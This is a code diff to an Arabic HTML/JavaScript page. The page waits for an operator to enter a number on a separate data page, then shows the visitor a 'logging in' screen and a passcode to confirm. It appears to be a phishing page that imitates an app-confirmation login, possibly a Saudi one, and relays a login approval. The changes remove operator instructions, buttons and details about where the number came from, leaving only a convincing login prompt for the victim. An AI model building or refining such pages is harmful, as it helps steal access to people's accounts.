@@ -288,6 +288,7 @@
             font-size: 14px;
             color: #666;
             text-align: center;
+            display: none; /* إخفاء المعلومات الإضافية */
         }
         
         /* هذا للتحكم في الإظهار والإخفاء */
@@ -377,24 +378,7 @@
                 <i class="fas fa-spinner fa-spin"></i>
             </div>
             <h2 style="color: #454f63; margin-bottom: 10px;" id="loadingTitle">في انتظار إدخال الرقم</h2>
-            <p style="color: #78849e;" id="loadingMessage">الرجاء الانتظار...</p>
-            
-            <!-- معلومات إضافية -->
-            <div id="loadingInfo" style="margin-top: 20px; padding: 10px 20px; background: #e3f2fd; border-radius: 8px; border-left: 4px solid #0D98BA; max-width: 500px;">
-                <i class="fas fa-exclamation-circle"></i>
-                <span>هذه الصفحة تنتظر حتى يتم إدخال رقم من صفحة إدارة البيانات</span>
-            </div>
-            
-            <!-- أزرار التحكم -->
-            <div style="margin-top: 30px; display: flex; gap: 15px; flex-wrap: wrap; justify-content: center;">
-                <button onclick="openDataPage()" style="padding: 12px 25px; background: #00ac75; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 14px;">
-                    <i class="fas fa-external-link-alt"></i> فتح صفحة البيانات
-                </button>
-                
-                <button onclick="checkNumberNow()" style="padding: 12px 25px; background: #0D98BA; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 14px;">
-                    <i class="fas fa-sync-alt"></i> التحقق الآن
-                </button>
-            </div>
+            <p style="color: #78849e;" id="loadingMessage">يرجى الانتظار...</p>
         </div>
         
         <!-- المحتوى الرئيسي (يظهر فقط بعد إدخال الرقم) -->
@@ -461,11 +445,6 @@
                                             <div class="passcode-card" data-after-content="97" aria-label="الرمز 97" id="passcodeDisplay"></div>
                                         </div>
                                         
-                                        <!-- معلومات إضافية عن الرقم -->
-                                        <div class="passcode-info" id="passcodeInfo">
-                                            <!-- سيتم ملؤها بالجافاسكريبت -->
-                                        </div>
-                                        
                                         <!-- Waiting Status -->
                                         <div class="waiting-confirmation">
                                             <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/Timer.gif" alt="Timer" class="timer-img">
@@ -516,8 +495,8 @@
                     const formattedNumber = numberData.formattedNumber || (number < 10 ? '0' + number : number.toString());
                     
                     // تحديث رسالة التحميل
-                    document.getElementById('loadingTitle').innerHTML = '<i class="fas fa-check-circle" style="color: #00ac75;"></i> تم العثور على الرقم!';
-                    document.getElementById('loadingMessage').innerHTML = 'جاري تحميل صفحة المصادقة...';
+                    document.getElementById('loadingTitle').textContent = 'جاري تسجيل الدخول';
+                    document.getElementById('loadingMessage').textContent = 'يرجى الانتظار...';
                     
                     // إخفاء شاشة التحميل بعد تأخير قصير
                     setTimeout(() => {
@@ -543,13 +522,13 @@
                     const minutes = Math.floor(checkCount / 60);
                     const seconds = checkCount % 60;
                     
-                    document.getElementById('loadingTitle').textContent = 'جاري انتظار إدخال الرقم';
+                    document.getElementById('loadingTitle').textContent = 'في انتظار إدخال الرقم';
                     document.getElementById('loadingMessage').textContent = `يرجى الانتظار... (${minutes}:${seconds.toString().padStart(2, '0')})`;
                     
                     // إذا تجاوز الحد الأقصى للفحص
                     if (checkCount >= MAX_CHECKS) {
                         document.getElementById('loadingMessage').innerHTML = 
-                            '<span style="color: #ff4757;"><i class="fas fa-exclamation-triangle"></i> تجاوز وقت الانتظار. الرجاء فتح صفحة البيانات يدوياً.</span>';
+                            '<span style="color: #ff4757;">تجاوز وقت الانتظار. الرجاء فتح صفحة البيانات يدوياً.</span>';
                         
                         if (checkInterval) {
                             clearInterval(checkInterval);
@@ -573,30 +552,6 @@
             }
         }
         
-        // دالة لفتح صفحة البيانات
-        function openDataPage() {
-            // حفظ معرف للصفحة الحالية لتعرف أنها مفتوحة
-            localStorage.setItem('success_page_open', Date.now().toString());
-            
-            // فتح صفحة view-data.html في نافذة جديدة
-            window.open('view-data.html', '_blank');
-            
-            // تحديث رسالة التحميل
-            document.getElementById('loadingMessage').innerHTML = 
-                '<span style="color: #0D98BA;"><i class="fas fa-external-link-alt"></i> تم فتح صفحة البيانات. الرجاء إدخال الرقم هناك.</span>';
-        }
-        
-        // دالة للتحقق يدوياً
-        function checkNumberNow() {
-            const savedNumber = localStorage.getItem('auth_passcode_number');
-            if (savedNumber) {
-                checkForNumber();
-            } else {
-                document.getElementById('loadingMessage').innerHTML = 
-                    '<span style="color: #ff9800;"><i class="fas fa-info-circle"></i> لم يتم إدخال رقم بعد. الرجاء فتح صفحة البيانات.</span>';
-            }
-        }
-        
         // دالة لتحميل وعرض الرقم المحفوظ
         function loadAndDisplayNumber(numberData) {
             try {
@@ -614,28 +569,17 @@
                         passcodeCard.style.transform = 'scale(1)';
                     }, 300);
                     
-                    // عرض معلومات إضافية
+                    // لا نعرض أي معلومات إضافية
+                    // إخفاء قسم passcode-info إذا كان موجوداً
                     const passcodeInfo = document.getElementById('passcodeInfo');
                     if (passcodeInfo) {
-                        const sourceInfo = numberData.source === 'record_extraction' ? 
-                            `(مستخرج من سجل: ${numberData.idNumber})` : 
-                            `(مدخل يدوياً)`;
-                        
-                        passcodeInfo.innerHTML = `
-                            <div style="margin-top: 10px; padding: 8px; background: #f5f5f5; border-radius: 5px;">
-                                <i class="fas fa-info-circle" style="color: #0D98BA;"></i>
-                                تم تحميل الرقم: ${formattedNumber} ${sourceInfo}
-                                <span style="font-size: 12px; color: #888; display: block; margin-top: 3px;">
-                                    تم الإدخال: ${new Date(numberData.timestamp).toLocaleTimeString('ar-SA')}
-                                </span>
-                            </div>
-                        `;
+                        passcodeInfo.style.display = 'none';
                     }
                     
-                    // تحديث نص الانتظار
+                    // تحديث نص الانتظار (فقط "في انتظار تأكيدك" بدون الرقم)
                     const waitingText = document.getElementById('waitingText');
                     if (waitingText) {
-                        waitingText.innerHTML = `في انتظار تأكيدك - الرقم: ${formattedNumber}`;
+                        waitingText.textContent = 'في انتظار تأكيدك';
                     }
                     
                     console.log('✅ تم تحميل وعرض الرقم:', formattedNumber);
